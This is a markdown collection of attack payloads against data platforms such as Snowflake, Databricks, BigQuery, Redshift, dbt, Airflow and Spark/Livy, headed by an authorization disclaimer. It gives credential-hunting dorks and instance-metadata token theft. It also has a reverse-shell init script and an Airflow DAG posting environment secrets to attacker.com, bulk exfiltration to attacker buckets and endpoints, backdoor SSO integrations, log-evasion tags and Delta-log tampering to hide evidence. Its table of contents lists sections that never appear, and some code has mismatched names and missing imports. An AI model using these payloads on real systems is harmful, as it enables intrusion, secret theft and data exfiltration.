# Data Platform Attack — Payloads

> Attack payloads and commands organized by platform: Snowflake, Databricks, BigQuery, Redshift, dbt, Airflow, Spark/Livy, and lakehouse cross-platform attacks.
>
> Replace `REPLACE_WITH_YOUR_X` placeholders with your own authorized engagement values. Never run any of these against systems you do not own or do not have written authorization to test.

## Table of Contents

1. [Reconnaissance — Account & Tenant Discovery](#1-reconnaissance--account--tenant-discovery)
2. [Snowflake Account Enumeration](#2-snowflake-account-enumeration)
3. [Snowflake Authentication — SSO, Key Pair, PAT](#3-snowflake-authentication--sso-key-pat)
4. [Snowflake Role & Privilege Abuse](#4-snowflake-role--privilege-abuse)
5. [Snowflake Network Policy Bypass](#5-snowflake-network-policy-bypass)
6. [Snowflake Data Exfiltration](#6-snowflake-data-exfiltration)
7. [Snowflake Secure Data Sharing Abuse](#7-snowflake-secure-data-sharing-abuse)
8. [Databricks — PAT Leak Discovery](#8-databricks--pat-leak-discovery)
9. [Databricks — Workspace Recon](#9-databricks--workspace-recon)
10. [Databricks — Secret Scope Abuse](#10-databricks--secret-scope-abuse)
11. [Databricks — Notebook Code Injection](#11-databricks--notebook-code-injection)
12. [Databricks — Cluster Init & Library Abuse](#12-databricks--cluster-init--library-abuse)
13. [Databricks — Azure AD App Injection](#13-databricks--azure-ad-app-injection)
14. [BigQuery — IAM Enumeration](#14-bigquery--iam-enumeration)
15. [BigQuery — Authorized Dataset & View Chains](#15-bigquery--authorized-dataset--view-chains)
16. [BigQuery — Federated Query & External Table Abuse](#16-bigquery--federated-query--external-table-abuse)
17. [BigQuery — Remote Function RCE](#17-bigquery--remote-function-rce)
18. [Redshift — IAM Chaining](#18-redshift--iam-chaining)
19. [Redshift — GetClusterCredentials Abuse](#19-redshift--getclustercredentials-abuse)
20. [Redshift — Serverless Enumeration](#20-redshift--serverless-enumeration)
21. [dbt — CI/CD Token Theft](#21-dbt--cicd-token-theft)
22. [dbt — manifest.json Recon](#22-dbt--manifestjson-recon)
23. [dbt — profiles.yml Secret Harvest](#23-dbt--profilesyml-secret-harvest)
24. [Airflow — Metadata DB Exposure](#24-airflow--metadata-db-exposure)
25. [Airflow — Connection & Variable Harvest](#25-airflow--connection--variable-harvest)
26. [Airflow — DAG Code Injection](#26-airflow--dag-code-injection)
27. [Airflow — FERNET_KEY Recovery](#27-airflow--fernet_key-recovery)
28. [Spark & Livy — Code Injection](#28-spark--livy--code-injection)
29. [Synapse & Fabric — Pool Abuse](#29-synapse--fabric--pool-abuse)
30. [Lakehouse Delta Corruption](#30-lakehouse-delta-corruption)
31. [Iceberg & Hudi Metadata Tampering](#31-iceberg--hudi-metadata-tampering)
32. [Warehouse SQL Injection at Scale](#32-warehouse-sql-injection-at-scale)
33. [Cross-Tenant Exfiltration Patterns](#33-cross-tenant-exfiltration-patterns)
34. [Detection Evasion — QUERY_TAG Poisoning](#34-detection-evasion--query_tag-poisoning)
35. [Persistence Patterns](#35-persistence-patterns)

---

## 1. Reconnaissance — Account & Tenant Discovery

### GitHub Dorks for Snowflake / Databricks / dbt

```
"snowflake_account" org:REPLACE_WITH_YOUR_TARGET
"snowflakecomputing.com" org:REPLACE_WITH_YOUR_TARGET
"DBT_CLOUD_API_TOKEN=" org:REPLACE_WITH_YOUR_TARGET
"dbt_profiles.yml" filename:profiles.yml
"DATABRICKS_TOKEN" org:REPLACE_WITH_YOUR_TARGET
"adb-" filename:.databrickscfg
"AIRFLOW_CONN_" filename:.env
"redshift_credentials" filename:terraform.tfvars
"bigquery_service_account" filename:service-account.json
```

### Snowflake Account URL Pattern Discovery

```bash
# Snowflake account URLs follow: <orgname>-<accountname>.snowflakecomputing.com
# Pre-2024 format: <account>.<region>.aws.snowflakecomputing.com
# 2024+ format: <org>-<acct>.snowflakecomputing.com

for acct in acme acme-prod acme-dev acme-ent acme-corpdwh; do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
    "https://${acct}.snowflakecomputing.com/console"
done
```

### Databricks Workspace URL Discovery

```bash
# Azure:  adb-<workspace-id>.<random>.<region>.databricks.azure.net
# AWS:    https://<workspace-name>.cloud.databricks.com
# GCP:    https://<workspace-name>.gcp.databricks.com

for w in acme-prod acme-staging acme-dev acme-ml acme-bi; do
  curl -sI "https://${w}.cloud.databricks.com" | head -1
done
```

### Airflow Webserver Fingerprinting

```bash
# Airflow default webserver banner exposes version
curl -s https://airflow.target.internal/login/ | grep -oP 'Airflow v[\d.]+'

# DagBag banner, visible in /health endpoint
curl -s https://airflow.target.internal/health | jq

# Common endpoints (often forgotten behind auth)
curl -s https://airflow.target.internal/api/v1/dagRuns
curl -s https://airflow.target.internal/api/v1/connections
```

---

## 2. Snowflake Account Enumeration

### SAML IdP Fingerprint (confirms account exists)

```bash
# Snowflake will 302 redirect to SAML IdP if account exists
# If account doesn't exist → 404
curl -sI "https://acme.snowflakecomputing.com/oauth/authorize" \
  | grep -iE '(HTTP|Location|Server)'
```

### DESCRIBE Organization

```sql
-- After login as any user
SHOW ORGANIZATION;
DESC ORGANIZATION;
-- Reveals: ORGANIZATION_NAME, ACCOUNT_NAME, REGION, EDITION, etc.
```

### Account Usage Recon

```sql
-- ACCOUNT_USAGE is a shared schema readable by most users
USE SCHEMA SNOWFLAKE.ACCOUNT_USAGE;

-- Users
SELECT name, email, login_name, has_password, has_rsa_public_key, default_role
FROM users WHERE deleted_on IS NULL;

-- Roles & grants
SHOW GRANTS;
SELECT * FROM grants_to_roles WHERE role = 'ACCOUNTADMIN';

-- Recent logins
SELECT event_timestamp, user_name, client_ip, reported_client_type,
       first_authentication_factor, second_authentication_factor
FROM login_history
ORDER BY event_timestamp DESC LIMIT 50;
```

---

## 3. Snowflake Authentication — SSO, Key Pair, PAT

### SSO via External Browser

```bash
export SNOWFLAKE_ACCOUNT="acme"
export SNOWFLAKE_USER="phished_user@acme.com"

snowsql -a $SNOWFLAKE_ACCOUNT -u $SNOWFLAKE_USER \
  --authenticator=externalbrowser \
  -q "SELECT current_user(), current_role();"
```

### Key-Pair Auth (when private key is leaked)

```bash
# Generate JWT from RSA key (snowflake docs pattern)
export SNOWFLAKE_ACCOUNT="acme"
export SNOWFLAKE_USER="svc_databricks"
export SNOWFLAKE_PRIVATE_KEY_PATH="./svc_databricks.p8"

snowsql -a $SNOWFLAKE_ACCOUNT -u $SNOWFLAKE_USER \
  --private-key-path $SNOWFLAKE_PRIVATE_KEY_PATH \
  -q "SHOW GRANTS TO USER svc_databricks;"
```

### JWT Direct Auth (service accounts)

```python
import snowflake.connector
import jwt

# Construct JWT from RSA key
with open('svc_databricks.p8', 'rb') as f:
    private_key = f.read()

ctx = snowflake.connector.connect(
    account='acme',
    user='svc_databricks',
    private_key=private_key,
    warehouse='LOADING_WH',
    database='PROD_DB',
    schema='PII'
)
cs = ctx.cursor()
cs.execute("SHOW GRANTS TO USER svc_databricks;")
for row in cs: print(row)
```

### Session Token Theft (Cookie Replay)

```bash
# After cookie theft via XSS or session hijack
# Snowflake session cookie: _snowflake_app_session_id
# Replay:
curl -b "_snowflake_app_session_id=STOLEN_VALUE" \
  "https://acme.snowflakecomputing.com/console#/monitoring"
```

---

## 4. Snowflake Role & Privilege Abuse

### Accountadmin via SCIM Mismatch

```sql
-- If SCIM role mapping includes a wildcard like:
--   "AAD_TO_SNOWFLAKE_ROLE_MAPPING": {"*": "ACCOUNTADMIN"}
-- then ANY AAD user can become ACCOUNTADMIN

USE ROLE USERADMIN;
SHOW USERS;  -- confirm self

-- Try role assumption
USE ROLE ACCOUNTADMIN;
SHOW GRANTS TO ROLE ACCOUNTADMIN;
```

### Role Grant Audit

```sql
USE SCHEMA SNOWFLAKE.ACCOUNT_USAGE;

-- Find roles granted to attackers pivoting account
SELECT created_on, granted_to, name, granted_by
FROM grants_to_roles
WHERE role = 'ACCOUNTADMIN'
ORDER BY created_on DESC;
```

### CREATE SECURITY INTEGRATION Tamper

```sql
-- Attacker who has ACCOUNTADMIN can backdoor with a SAML integration
CREATE SECURITY INTEGRATION attacker_idp
  TYPE = SAML2
  SAML2_ISSUER = 'https://attacker-idp.example.com'
  SAML2_SSO_URL = 'https://attacker-idp.example.com/sso'
  SAML2_PROVIDER = 'CUSTOM'
  SAML2_X509_CERT = 'REPLACE_WITH_ATTACKER_CERT';
```

---

## 5. Snowflake Network Policy Bypass

### Network Policy Recon

```sql
SHOW NETWORK POLICIES;
DESC NETWORK POLICY corp_policy;

-- Reveals ALLOWED_IP_LIST, BLOCKED_IP_LIST
-- If ALLOWED contains 0.0.0.0/0 → bypass already trivial
```

### Network Policy Bypass via Permitted CIDR

```bash
# If the policy allows 10.0.0.0/8 but blocks everything else,
# identify a CI runner in that CIDR (often 10.x for self-hosted runners)
# Pivot through the runner's session

# Or, if the target has a Snowflake user with a per-user policy
# (network_policy for that user only), it overrides global
# Try CREATE USER with a self-granting policy after compromise
```

### NETWORK RULE Abuse (External API Egress)

```sql
-- NETWORK RULES allow egress to user-defined host lists
-- If attacker can ALTER a NETWORK RULE, they can exfil via UDF HTTP
SHOW NETWORK RULES;

CREATE OR REPLACE NETWORK RULE attacker_egress
  MODE = EGRESS
  TYPE = HOST_PORT
  VALUE_LIST = ('attacker.com:443');

-- Then reference it in an API INTEGRATION
```

---

## 6. Snowflake Data Exfiltration

### COPY INTO External Stage

```sql
-- Standard exfil — appears as one COPY in audit logs
USE WAREHOUSE LOAD_WH;
CREATE STAGE IF NOT EXISTS attacker_stage
  URL = 's3://attacker-bucket/exfil/'
  CREDENTIALS = (AWS_KEY_ID='REPLACE_WITH_YOUR_AKI' AWS_SECRET_KEY='REPLACE_WITH_YOUR_SK');

COPY INTO @attacker_stage/customers.csv
  FROM PROD_DB.PII.CUSTOMERS
  FILE_FORMAT = (TYPE=CSV FIELD_OPTIONALLY_ENCLOSED_BY='"');
```

### COPY INTO with Query Tag Evasion

```sql
-- Blend exfil into a known periodic job tag
ALTER SESSION SET QUERY_TAG='nightly_refresh_dag_backfill';

COPY INTO @attacker_stage/users.csv FROM PROD_DB.PII.USERS;
```

### UDF-based Exfil

```sql
-- API INTEGRATION → call attacker endpoint per row
CREATE OR REPLACE API INTEGRATION attacker_api
  API_PROVIDER = aws_api_gateway
  API_AWS_ROLE_ARN = 'arn:aws:iam::REPLACE_WITH_YOUR_ACCT:role/snowflake_api'
  API_ALLOWED_PREFIXES = ('https://attacker.com/')
  ENABLED = true;

CREATE OR REPLACE EXTERNAL FUNCTION exfil_exfil(s string)
  RETURNS string
  API_INTEGRATION = attacker_api
  AS 'https://attacker.com/collect';

SELECT exfil_exil(to_json(parse_json(users.*))) FROM PROD_DB.PII.USERS;
```

### Result Scan Exfil

```sql
-- Reuse a recent in-memory result
SELECT * FROM TABLE(RESULT_SCAN('01abc...')) LIMIT 1000;

-- Persist it elsewhere:
CREATE TABLE tmp_cache AS SELECT * FROM TABLE(RESULT_SCAN('01abc...'));
```

---

## 7. Snowflake Secure Data Sharing Abuse

### Cross-Account Share Discovery

```sql
SHOW SHARES;
-- Look for OUTBOUND shares — data leaving this account
DESC SHARE outbound_to_partner_acct;

-- If you have ACCOUNTADMIN, create an OUTBOUND share to attacker account:
CREATE SHARE to_attacker;
GRANT USAGE ON DATABASE prod_db TO SHARE to_attacker;
GRANT USAGE ON SCHEMA prod_db.pii TO SHARE to_attacker;
GRANT SELECT ON TABLE prod_db.pii.customers TO SHARE to_attacker;
ALTER SHARE to_attacker ADD ACCOUNTS = 'attacker-acct-id';
```

### Reader Account Abuse

```sql
-- Reader accounts areSnowflake-managed accounts for sharing data externally
-- If you can create a reader account, you can exfil via the reader's URL
CREATE READER ACCOUNT attacker_reader
  ADMIN_NAME = 'attacker'
  ADMIN_PASSWORD = 'REPLACE_WITH_YOUR_PW'
  ADMIN_LOGIN = 'attacker'
  COMMENT = 'Authorized reader for engagement';
-- The reader account URL becomes exfil endpoint
```

---

## 8. Databricks — PAT Leak Discovery

### Where PATs Leak

```bash
# GitHub dorks
"DAP " filename:.databrickscfg
"dapi" filename:.env
"DATABRICKS_TOKEN=" org:target
"Bearer dapi"

# CI log dorks (CircleCI / GitHub Actions)
"export DATABRICKS_TOKEN=dapi"
# Slack / Jira / Confluence
site:atlassian.net "dapi"
# Notebook exports
"dbutils.secrets.get" filename:notebook.scala
```

### PAT Validation

```bash
export DATABRICKS_HOST="https://acme.cloud.databricks.com"
export DATABRICKS_TOKEN="REPLACE_WITH_YOUR_PAT"

# Current token metadata
curl -s -H "Authorization: Bearer $DATABRICKS_TOKEN" \
  "$DATABRICKS_HOST/api/2.0/token-management/current"

# JSON output includes: creation_time, expiry_time, owner, scope
```

---

## 9. Databricks — Workspace Recon

### Workspace Enumeration via CLI

```bash
databricks workspace list /
databricks workspace list /Users/phished@acme.com

# Recursive export
databricks workspace export-dir / /tmp/dbks_dump/
```

### Cluster List (with instance profiles)

```bash
databricks clusters list --output JSON | \
  jq '.[] | {cluster_id, cluster_name, aws_attributes, azure_attributes}'

# Look for aws_attributes.instance_profile_arn — that's your pivot to AWS
```

### Job Recon

```bash
databricks jobs list --output JSON | jq '.jobs[] | {job_id, name, owner, settings}'

# Job definitions often contain task parameters with embedded secrets
databricks jobs get --job-id 12345 | jq '.settings.tasks[].notebook_task.base_parameters'
```

### Workspace Search via API

```bash
# Search across all notebooks for secrets
curl -s -H "Authorization: Bearer $DATABRICKS_TOKEN" \
  "$DATABRICKS_HOST/api/2.0/workspace/search?query=dbutils.secrets.get" | \
  jq '.objects[].path'
```

---

## 10. Databricks — Secret Scope Abuse

### List Scopes & ACLs

```bash
databricks secrets list-scopes
databricks secrets list-acls --scope prod-secrets

# Databricks-backed scope ACLs are often misconfigured
# (e.g., "users" group with READ)
```

### Read Secrets

```bash
databricks secrets list --scope prod-secrets
databricks secrets get --scope prod-secrets --key snowflake_password
```

### ACL Escalation

```bash
# If you have MANAGE on a scope (rare but found), grant yourself READ
databricks secrets put-acl --scope prod-secrets --principal attacker@acme.com --permission READ
```

### Azure Key Vault-backed Scope Abuse

```bash
# Azure Databricks secret scopes can be AKV-backed
# If you have READ on the scope, you have READ on the underlying AKV
databricks secrets list --scope akv-backed-scope
# Each key in the scope maps to a secret in AKV
```

---

## 11. Databricks — Notebook Code Injection

### %python Cell RCE

```python
# In a notebook cell
%python
import os, subprocess
# Read IMDS for AWS instance profile
out = subprocess.check_output([
    'curl', '-s',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
])
print(out.decode())
```

### %scala Cell RCE

```scala
%scala
import scala.sys.process._
val creds = "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/".!!
println(creds)
```

### %sh Cell (Bash directly)

```bash
%sh
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -1
```

### Malicious Notebook Import

```bash
# Import a weaponized notebook that runs on attach
databricks workspace import \
  --path /Shared/refresh_helper \
  --file ./payload notebook \
  --format SOURCE \
  --language PYTHON \
  --overwrite
```

### %r Cell (often forgotten)

```r
%r
system("curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/")
```

---

## 12. Databricks — Cluster Init & Library Abuse

### Init Script with Reverse Shell

```bash
# Cluster-scoped init script
cat > ./init.sh <<'EOF'
#!/bin/bash
nohup bash -c 'while true; do curl -s http://attacker.com/c2 | sh; done' &
EOF
databricks clusters create --json '{
  "cluster_name": "shared-etl",
  "spark_version": "13.3.x-scala2.12",
  "node_type_id": "i3.xlarge",
  "init_scripts": [{"dbfs": {"destination": "dbfs:/init/init.sh"}}]
}'
```

### Malicious Library Upload (.whl)

```bash
# Build a wheel with a setup.py that runs on install
python setup.py bdist_wheel

# Upload to DBFS
dbfs cp payload-0.0.1-py3-none-any.whl dbfs:/libraries/

# Install via API
curl -X POST -H "Authorization: Bearer $DATABRICKS_TOKEN" \
  "$DATABRICKS_HOST/api/2.0/libraries/install" \
  -d '{"cluster_id": "1234-567890-cipher1", "libraries": [{"whl": "dbfs:/libraries/payload-0.0.1-py3-none-any.whl"}]}'
```

---

## 13. Databricks — Azure AD App Injection

### Service Principal Takeover

```bash
# If you compromise the AAD app behind a Databricks workspace
# You can issue new workspace tokens directly

az login --service-principal -u $APP_ID -p $CERT --tenant $TENANT
az account get-access-token --resource 2ff814a6-3304-4ab8-85cb-cd0e2415f871
# That token is a workspace admin bearer token
```

### PAT Generation via Admin API

```bash
# Workspace admin can create long-lived tokens for any user
curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$DATABRICKS_HOST/api/2.0/token-management/tokens" \
  -d '{"lifetime_seconds": 2592000, "comment": "engagement"}'
```

---

## 14. BigQuery — IAM Enumeration

### Project Discovery

```bash
gcloud projects list --format="table(projectId,name,projectNumber)"

# After SA key compromise:
gcloud auth activate-service-account --key-file=./sa.json
gcloud config set project REPLACE_WITH_YOUR_PROJECT
```

### Permission Brute Force

```bash
# enumerate-iam from cfalta
python3 enumerate_iam.py --service-account ./sa.json
# Outputs every gcloud call that succeeds
```

### Dataset / Table Recon

```bash
bq ls --projects=acme-prod
bq ls --project_id=acme-prod --format=prettyjson
bq show --format=prettyjson acme-prod:pii.users
```

### Information Schema Recon

```sql
-- Across all datasets in region
SELECT table_schema, table_name, table_type
FROM `region-us`.INFORMATION_SCHEMA.TABLES
WHERE table_catalog = 'acme-prod';

-- Column-level PII discovery
SELECT table_schema, table_name, column_name, data_type
FROM `region-us`.INFORMATION_SCHEMA.COLUMNS
WHERE column_name LIKE '%email%'
   OR column_name LIKE '%ssn%'
   OR column_name LIKE '%phone%';
```

---

## 15. BigQuery — Authorized Dataset & View Chains

### Authorized View Chaining

```sql
-- If you have access to a view, and that view is authorized to a dataset,
-- you can read any table in that dataset through the view
SELECT * FROM `acme-prod.shared.dashboard_v`;

-- Bypass via view:
CREATE OR REPLACE VIEW `acme-prod.attacker_view` AS
SELECT * FROM `acme-prod.pii.users`;

-- (requires you have bigquery.datasets.create — works on your own project)
```

### Authorized Dataset Pivot

```bash
# Show authorized views on a dataset
bq show --format=prettyjson acme-prod:pii | jq '.access'

# If a view in a SHARED project is authorized to read pii
# You can query the view to read pii
bq query --use_legacy_sql=false \
  'SELECT * FROM `shared-prod.analytics.user_summary_v` LIMIT 1000'
```

---

## 16. BigQuery — Federated Query & External Table Abuse

### External Table on Attacker Bucket

```bash
# Create an external table backed by attacker GCS (data exfil via federated query)
bq mk --external_table_definition=gs://attacker-bucket/data/*.parquet//attacker_dataset.ext_tab

# Then UNLOAD sensitive data INTO that table:
bq query --use_legacy_sql=false \
  'EXPORT DATA OPTIONS(uri="gs://attacker-bucket/exfil/*.csv", format="CSV") AS
   SELECT * FROM `acme-prod.pii.users`'
```

### BigLake / Cloud Storage Federation

```sql
-- BigLake tables share underlying files
-- If you have access to the BigLake table, you can read raw files via the connection
SELECT * FROM `acme-prod.biglake.customers`;
```

---

## 17. BigQuery — Remote Function RCE

### Setup Remote Function to Attacker Cloud Function

```bash
# Create a Cloud Run / Lambda function with HTTP trigger
# Then in BigQuery:

bq query --use_legacy_sql=false "
CREATE OR REPLACE FUNCTION \`acme-prod.utils.exfil\`(x STRING)
RETURNS STRING
REMOTE WITH CONNECTION \`projects/acme-prod/locations/us/connections/attacker-conn\`
OPTIONS (endpoint = 'https://attacker-run-abc.a.run.dev');
"

# Then call it on sensitive data:
bq query --use_legacy_sql=false "
SELECT \`acme-prod.utils.exfil\`(TO_JSON_STRING(users))
FROM \`acme-prod.pii.users\` LIMIT 1000;
"
```

---

## 18. Redshift — IAM Chaining

### Identify Cluster IAM Role

```bash
aws redshift describe-clusters --cluster-identifier acme-prod-rs \
  --query 'Clusters[].IamRoles[*].IamRoleArn' --output text
```

### GetClusterCredentials → Connect → Pivot

```bash
# Use a low-priv role to fetch temp creds
aws redshift get-cluster-credentials \
  --cluster-identifier acme-prod-rs \
  --db-user bi_service \
  --db-name prod

# Returns: DbUser, DbPassword, Expiration
psql "host=acme-prod-rs.x.redshift.amazonaws.com \
       port=5439 dbname=prod \
       user=temp_bi_service password=TEMP_PW"
```

### ExecuteStatement → IAM Role

```bash
# Once you have redshift-data:ExecuteStatement on the cluster's IAM role,
# you can execute SQL that reads S3 via the cluster's role
aws redshift-data execute-statement \
  --cluster-identifier acme-prod-rs \
  --database prod \
  --db-user bi_service \
  --sql "SELECT * FROM spectrum_external.s3_pii LIMIT 1000"
```

---

## 19. Redshift — GetClusterCredentials Abuse

### Lateral to Superuser

```bash
# If GetClusterCredentials allows DbUser=* or DbUser=admin
aws redshift get-cluster-credentials \
  --cluster-identifier acme-prod-rs \
  --db-user admin \
  --db-name prod \
  --custom-domain-name REPLACE_WITH_YOUR_DOMAIN
```

### Serverless Workgroup Pivot

```bash
aws redshift-serverless get-credentials \
  --workgroup-name acme-prod-sl \
  --duration-seconds 3600
```

---

## 20. Redshift — Serverless Enumeration

### List Workgroups & Namespaces

```bash
aws redshift-serverless list-workgroups
aws redshift-serverless list-namespaces
aws redshift-serverless list-snapshots
aws redshift-serverless list-usage-limits
```

### Snapshot Exfil

```bash
# If you have restore permissions, share snapshot to attacker account
aws redshift-serverless copy-snapshot \
  --source-snapshot-name acme-prod-snap \
  --source-snapshot-namespace-identifier acme-ns \
  --target-snapshot-name attacker-snap \
  --target-kms-key-id alias/attacker-key
```

---

## 21. dbt — CI/CD Token Theft

### Common dbt Token Leak Locations

```bash
# GitHub Actions default log redaction misses env var exports
# Search artifacts for:
"dbt_cloud_service_token_"
"DBT_CLOUD_API_TOKEN"
"dbt_cloud_user_token"

# Slack / Linear
"Service Token" dbt project:acme

# Confluence / Notion
site:notion.so "DBT_CLOUD_API_TOKEN"

# .dbt/profiles.yml in CI runners
profiles.yml password:
```

### Token Validation

```bash
export DBT_CLOUD_API_TOKEN="REPLACE_WITH_YOUR_TOKEN"
export DBT_CLOUD_ACCOUNT_ID="12345"

curl -H "Authorization: Token $DBT_CLOUD_API_TOKEN" \
  "https://cloud.getdbt.com/api/v2/accounts/$DBT_CLOUD_ACCOUNT_ID/projects/"
```

### Fetch Service Token Permissions

```bash
curl -H "Authorization: Token $DBT_CLOUD_API_TOKEN" \
  "https://cloud.getdbt.com/api/v2/accounts/$DBT_CLOUD_ACCOUNT_ID/service-tokens/" | jq
```

---

## 22. dbt — manifest.json Recon

### Download Latest Run Artifacts

```bash
# Manifest contains every model, source, and test in the project
curl -H "Authorization: Token $DBT_CLOUD_API_TOKEN" \
  "https://cloud.getdbt.com/api/v2/accounts/$DBT_CLOUD_ACCOUNT_ID/runs/<RUN_ID>/artifacts/manifest.json" \
  -o manifest.json

# Extract all sources (Snowflake tables referenced)
jq '.sources | to_entries[] | {node: .key, database: .value.database, schema: .value.schema, name: .value.name}' manifest.json
```

### Catalog Recon

```bash
# catalog.json has column-level info from latest run
curl -H "Authorization: Token $DBT_CLOUD_API_TOKEN" \
  "https://cloud.getdbt.com/api/v2/accounts/$DBT_CLOUD_ACCOUNT_ID/runs/<RUN_ID>/artifacts/catalog.json" \
  -o catalog.json

# Find PII columns
jq '.nodes | to_entries[] | select(.value.columns | to_entries[].value.name | test("email|ssn|phone"; "i")) | .key' catalog.json
```

---

## 23. dbt — profiles.yml Secret Harvest

### Typical profiles.yml

```yaml
# Often found in CI runners / developer workstations
acme:
  target: prod
  outputs:
    prod:
      type: snowflake
      account: acme
      user: dbt_service
      password: REPLACE_WITH_YOUR_PASSWORD  # ← jackpot
      role: TRANSFORMER
      warehouse: TRANSFORMING
      database: PROD_DB
      schema: TRANSFORM
```

### Trigger dbt Cloud Job to Run Custom Code

```bash
# If you have a job-dispatch token, you can submit arbitrary dbt commands
curl -X POST -H "Authorization: Token $DBT_CLOUD_API_TOKEN" \
  "https://cloud.getdbt.com/api/v2/accounts/$DBT_CLOUD_ACCOUNT_ID/jobs/<JOB_ID>/run/" \
  -d '{"cause": "engagement", "git_branch": "main"}'
```

---

## 24. Airflow — Metadata DB Exposure

### Direct DB Connection

```bash
# Often: Airflow scheduler + worker + webserver share RDS-backed metadata DB
# Connection string in env:
psql "host=rds-host.cluster-x.rds.amazonaws.com \
      port=5432 dbname=airflow user=airflow password=REPLACE_WITH_YOUR_PW"

# Inspect tables
\dt
SELECT count(*) FROM connection;
SELECT count(*) FROM variable;
SELECT count(*) FROM dag_run;
```

### FERNET_KEY Recovery

```bash
# Pull from env / config file
echo $AIRFLOW__CORE__FERNET_KEY
grep fernet_key /etc/airflow/airflow.cfg

# Or via Kubernetes secret if Airflow on K8s
kubectl get secret airflow-fernet-key -o jsonpath='{.data.fernet-key}' | base64 -d
```

---

## 25. Airflow — Connection & Variable Harvest

### Connections Table (Encrypted)

```sql
SELECT conn_id, conn_type, host, login, password, extra
FROM connection
ORDER BY conn_id;
-- password is Fernet-encrypted; needs FERNET_KEY
```

### Decrypt Connections Offline

```python
from cryptography.fernet import Fernet
import json

fkey = b'REPLACE_WITH_YOUR_FERNET_KEY'
f = Fernet(fkey)

# For each connection's password field:
enc_pw = b'gAAAAAB...'  # from connection.password
print(f.decrypt(enc_pw).decode())
```

### Variables (Often Plaintext JSON)

```sql
SELECT key, val FROM variable;
-- val is Fernet-encrypted; same recovery as connections
```

### Airflow CLI Bypass

```bash
# If webserver auth is weak (demo / default creds)
airflow connections list
airflow connections get snowflake_default
airflow variables get aws_access_key
```

---

## 26. Airflow — DAG Code Injection

### DAG Repo Compromise → Backdoor

```python
# In a DAG file pushed via CI/CD:
from airflow import DAG
from airflow.operators.python import PythonOperator
from datetime import datetime
import subprocess, os

def _persist():
    # Exfil environment on every DAG run
    subprocess.run([
        'curl', '-X', 'POST',
        '-d', json.dumps(dict(os.environ)),
        'https://attacker.com/collect'
    ])

with DAG('refresh_helper', start_date=datetime(2024, 1, 1),
         schedule_interval='@daily', catchup=False) as dag:
    PythonOperator(task_id='refresh', python_callable=_persist)
```

### Kubernetes Executor Pod Spec Tamper

```python
# In an operator that accepts executor_config:
from airflow.kubernetes.volume import Volume
from airflow.kubernetes.volume_mount import VolumeMount

# Inject a hostPath mount
executor_config = {
    "KubernetesExecutor": {
        "volumes": [{
            "name": "host",
            "hostPath": {"path": "/", "type": "Directory"}
        }],
        "volume_mounts": [{
            "name": "host", "mountPath": "/host"
        }]
    }
}
```

---

## 27. Airflow — FERNET_KEY Recovery

### Common Locations

```bash
# Env var
echo $AIRFLOW__CORE__FERNET_KEY

# Config file
grep -r fernet_key /etc/airflow/ /opt/airflow/

# Kubernetes secret
kubectl get secret -n airflow -o yaml | grep -i fernet

# Helm values.yaml
grep -r fernetKey helm/airflow/
```

### Master Key Recovery for Older Airflow

```python
# Airflow < 1.10.6 used a default FERNET_KEY
# Documented at: https://airflow.apache.org/docs/apache-airflow/stable/security/security.html
# Default: <printed in docs> — rotate if you find this in production
DEFAULT_FERNET = b'...'  # redacted; check upstream docs
```

---

## 28. Spark & Livy — Code Injection

### Livy REST API RCE

```bash
# Livy (Spark REST) often exposed on port 8998 without auth
curl -X POST -H "Content-Type: application/json" \
  http://spark-livy.target:8998/sessions \
  -d '{"kind": "pyspark"}'

# Once session is up:
curl -X POST http://spark-livy.target:8998/sessions/0/statements \
  -H "Content-Type: application/json" \
  -d '{"code": "import os\nos.popen(\"id; curl http://attacker.com/$(id -u)\").read()"}'
```

### Spark Web UI Proxy Auth Bypass

```bash
# Some Spark UIs allow setting spark.executorEnv.* via query string
curl "http://spark-master:8080/?spark.executorEnv.LD_PRELOAD=/tmp/evil.so"
```

### Spark-submit with Malicious JAR

```bash
# If you can submit jobs to the cluster
spark-submit --master spark://cluster:7077 \
  --class com.attacker.Main \
  --jars http://attacker.com/evil.jar \
  local-dummy.jar
```

---

## 29. Synapse & Fabric — Pool Abuse

### Synapse Spark Pool IMDS

```python
# In a notebook, %pyspark cell
%pyspark
import requests
r = requests.get('http://169.254.169.254/metadata/identity/oauth2?api-version=2018-02-01&resource=https://storage.azure.com/',
                 headers={'Metadata': 'true'})
print(r.json()['access_token'])
```

### Fabric Capacity Hijack

```bash
# If you compromise a Fabric service principal, you can:
# 1. Read all Power BI workspaces the SPN has access to
# 2. Pivot to OneLake via ABFS
az storage blob list --account-name onelake --container-name workspace
```

### Dedicated SQL Pool (formerly SQL DW) Attacks

```sql
-- Synapse dedicated pool supports T-SQL — same SQLi surface as MSSQL
-- Pivot via OPENROWSET to read from external tables
SELECT * FROM OPENROWSET(
  BULK 'https://attacker.com/list.csv',
  FORMAT = 'CSV') AS x;
```

---

## 30. Lakehouse Delta Corruption

### Delta Log Structure

```bash
# Delta Lake tracks versions in _delta_log/
# Each commit: 00000000000000000000.json
# Manifest: _last_checkpoint

# Read the latest version
cat s3://bucket/path/_delta_log/_last_checkpoint
# {"version":42,"size":1234,"parts":null,"size":1234}
```

### Tamper with Delta Log (requires write on bucket)

```bash
# Append a fake commit that "deletes" incriminating rows
cat > 00000000000000000043.json <<'EOF'
{"remove":{"path":"part-00000-f00.c000.snappy.parquet"}}
{"add":{"path":"part-00000-bad.c000.snappy.parquet","size":1234,"modificationTime":1700000000000,"dataChange":true}}
EOF

# Upload via compromised service principal
aws s3 cp 00000000000000000043.json \
  s3://bucket/path/_delta_log/00000000000000000043.json
```

### Checkpoint Tampering

```bash
# Delta uses Parquet checkpoints every 10 commits
# Tamper with checkpoint to hide history
aws s3 cp ./evil_checkpoint.parquet \
  s3://bucket/path/_delta_log/00000000000000000040.checkpoint.parquet
```

---

## 31. Iceberg & Hudi Metadata Tampering

### Iceberg Manifest Manipulation

```bash
# Iceberg catalog (Hive / Glue / REST) tracks:
# - metadata/metadata.json
# - manifest/list of avro files
# - snapshot log

# Tampering requires write to catalog AND object store
# Easiest path: compromised service principal with full s3 access
```

### Hudi Timeline Corruption

```bash
# Hudi uses .commit, .deltacommit, .replacecommit files in .hoodie/
# Appending a .replacecommit lets you atomically replace the dataset
```

---

